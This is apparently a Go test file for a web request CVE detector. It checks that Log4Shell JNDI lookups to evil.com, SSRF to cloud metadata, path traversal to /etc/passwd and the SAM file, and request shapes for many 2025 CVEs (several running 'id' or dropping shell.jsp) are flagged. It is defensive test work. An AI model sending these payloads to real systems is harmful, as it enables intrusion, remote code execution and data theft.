package cve

import (
	"testing"
)

func TestCVEDetector_PHPDeserialization(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name    string
		body    string
		wantCVE string
	}{
		{"serialized object", `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`, "CVE-2015-6835"},
		{"serialized array", `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}`, "CVE-2015-6835"},
		{"unserialize call", `data=unserialize($_GET['input'])`, "CVE-2015-6835"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/", "", nil, []byte(tt.body), "application/x-www-form-urlencoded")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == tt.wantCVE {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected CVE %s to be detected for input %q", tt.wantCVE, tt.body)
			}
		})
	}
}

func TestCVEDetector_Log4Shell(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name  string
		input string
	}{
		{"basic jndi ldap", "${jndi:ldap://evil.com/a}"},
		{"basic jndi rmi", "${jndi:rmi://evil.com/a}"},
		{"bypass nested lower", "${${lower:j}ndi:ldap://evil.com/a}"},
		{"bypass j-n split", "${j${::-n}di:ldap://evil.com/a}"},
		{"bypass jn-d split", "${jn${::-d}i:ldap://evil.com/a}"},
		{"url encoded", "%24%7Bjndi:ldap://evil.com/a%7D"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/", "x="+tt.input, nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2021-44228" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Log4Shell not detected for: %s", tt.input)
			}
		})
	}
}

func TestCVEDetector_SSRF(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name  string
		query string
	}{
		{"internal 10.x", "url=http://10.0.0.1/admin"},
		{"internal 172.16", "url=http://172.16.0.1/secret"},
		{"internal 192.168", "url=http://192.168.1.1/config"},
		{"localhost", "url=http://localhost/admin"},
		{"127.0.0.1", "url=http://127.0.0.1/secret"},
		{"cloud metadata", "url=http://169.254.169.254/latest/meta-data/"},
		{"gcloud metadata", "url=http://metadata.google.internal/computeMetadata/v1/"},
		{"file protocol", "url=file:///etc/passwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/fetch", tt.query, nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2019-SSRF" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("SSRF not detected for query: %s", tt.query)
			}
		})
	}
}

func TestCVEDetector_CategorySensitivity_OffDisablesGeneralDetector(t *testing.T) {
	d := NewCVEDetector()
	req := BuildCVERequest("/fetch", "url=http://169.254.169.254/latest/meta-data/", nil, nil, "")
	matches := d.Detect(req, map[string]string{"cve_general": "off"})
	for _, m := range matches {
		if m.CVEID == "CVE-2019-SSRF" {
			t.Fatalf("expected cve_general to be disabled, got %+v", matches)
		}
	}
}

func TestCVEDetector_PathTraversal(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name string
		path string
	}{
		{"double encoded", "/files/%252e%252e%252f%252e%252e%252fetc/passwd"},
		{"windows backslash", "/files/..\\..\\windows\\system32\\config\\sam"},
		{"encoded backslash", "/files/..%5c..%5cwindows"},
		{"null byte", "/files/../../%00"},
		{"quad dot", "/files/....//etc/passwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, "", nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2019-PATHTRA" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("path traversal not detected for: %s", tt.path)
			}
		})
	}
}

func TestCVEDetector_RecentWebCVEs(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name        string
		path        string
		query       string
		headers     map[string]string
		body        string
		contentType string
		wantCVE     string
	}{
		{
			name:    "vite fs raw bypass",
			path:    "/@fs/tmp/secret.txt",
			query:   "import&raw??",
			wantCVE: "CVE-2025-30208",
		},
		{
			name:        "langflow validate code rce",
			path:        "/api/v1/validate/code",
			body:        `{"code":"__import__('os').system('id')"}`,
			contentType: "application/json",
			wantCVE:     "CVE-2025-3248",
		},
		{
			name:    "xwiki solrsearch groovy rce",
			path:    "/xwiki/bin/get/Main/SolrSearch",
			query:   "media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(42)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D",
			wantCVE: "CVE-2025-24893",
		},
		{
			name:        "sharepoint toolshell toolpane",
			path:        "/_layouts/15/ToolPane.aspx",
			query:       "DisplayMode=Edit&a=/ToolPane.aspx",
			headers:     map[string]string{"Referer": "/_layouts/SignOut.aspx"},
			body:        "MSOTlPn_DWP=payload&__VIEWSTATE=large",
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-53770",
		},
		{
			name:    "sharepoint toolshell web shell",
			path:    "/_layouts/15/spinstall0.aspx",
			wantCVE: "CVE-2025-53770",
		},
		{
			name:        "commvault deploywebpackage rce",
			path:        "/commandcenter/deployWebpackage.do",
			body:        "commcellName=http://attacker.example&servicePack=../../Reports/MetricsUpload/shell/&version=x",
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-34028",
		},
		{
			name:        "crs multipart dangerous charset bypass",
			path:        "/upload",
			body:        "--abc\r\nContent-Disposition: form-data; name=\"username\"\r\nContent-Type: text/plain; charset=utf-7\r\n\r\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-\r\n--abc\r\nContent-Disposition: form-data; name=\"dummy\"\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nok\r\n--abc--\r\n",
			contentType: "multipart/form-data; boundary=abc",
			wantCVE:     "CVE-2026-21876",
		},
		{
			name:        "wing ftp null byte lua rce",
			path:        "/loginok.html",
			body:        `username=anonymous%00]]%0dlocal+h+%3d+io.popen("id")%0d--&password=x`,
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-47812",
		},
		{
			name:        "magicinfo swupdate traversal file write",
			path:        "/MagicInfo/servlet/SWUpdateFileUploader",
			body:        `fileName=../../../../server/default/deploy/shell.jsp&file=test`,
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-4632",
		},
		{
			name:    "fortiweb fwbcgi cgiinfo auth bypass",
			path:    "/api/v2.0/cmd/system/admin%3F/../../../../../cgi-bin/fwbcgi",
			headers: map[string]string{"CGIINFO": "eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJwcm9mX2FkbWluIn0="},
			body:    `{}`,
			wantCVE: "CVE-2025-64446",
		},
		{
			name:    "goanywhere license activation auth bypass",
			path:    "/goanywhere/license/Unlicensed.xhtml/watchTowr",
			query:   "javax.faces.ViewState=x&GARequestAction=activate",
			wantCVE: "CVE-2025-10035",
		},
		{
			name:        "spring gateway actuator spel",
			path:        "/actuator/gateway/routes/rce",
			body:        `{"filters":[{"name":"AddResponseHeader","args":{"name":"x","value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}]}`,
			contentType: "application/json",
			wantCVE:     "CVE-2025-41243",
		},
		{
			name:        "invision customcss expression rce",
			path:        "/",
			body:        `app=core&module=system&controller=themeeditor&do=customCss&content=%7Bexpression%3D%22die(system('id'))%22%7D`,
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-47916",
		},
		{
			name:    "crushftp s3 auth bypass",
			path:    "/WebInterface/function/",
			query:   "command=getUserList&serverGroup=MainUsers",
			headers: map[string]string{"Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/, SignedHeaders=host, Signature=deadbeef"},
			wantCVE: "CVE-2025-31161",
		},
		{
			name:    "fortinet authhash hostcheck rce",
			path:    "/remote/hostcheck_validate",
			headers: map[string]string{"Cookie": "AuthHash=enc=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
			wantCVE: "CVE-2025-32756",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, tt.query, tt.headers, []byte(tt.body), tt.contentType)
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == tt.wantCVE {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("%s not detected, matches=%v", tt.wantCVE, matches)
			}
		})
	}
}

func TestCVEDetector_NoFalsePositive(t *testing.T) {
	d := NewCVEDetector()

	// Normal requests should not trigger CVE detection
	normalRequests := []struct {
		name  string
		path  string
		query string
		body  string
	}{
		{"simple GET", "/api/users", "page=1&limit=10", ""},
		{"json POST", "/api/login", "", `{"username":"admin","password":"test123"}`},
		{"static file", "/assets/main.css", "", ""},
	}

	for _, tt := range normalRequests {
		t.Run(tt.name, func(t *testing.T) {
			var bodyBytes []byte
			if tt.body != "" {
				bodyBytes = []byte(tt.body)
			}
			req := BuildCVERequest(tt.path, tt.query, nil, bodyBytes, "application/json")
			matches := d.Detect(req)
			if len(matches) > 0 {
				t.Errorf("false positive on normal request %q: got %d matches: %v", tt.name, len(matches), matches[0].CVEID)
			}
		})
	}
}
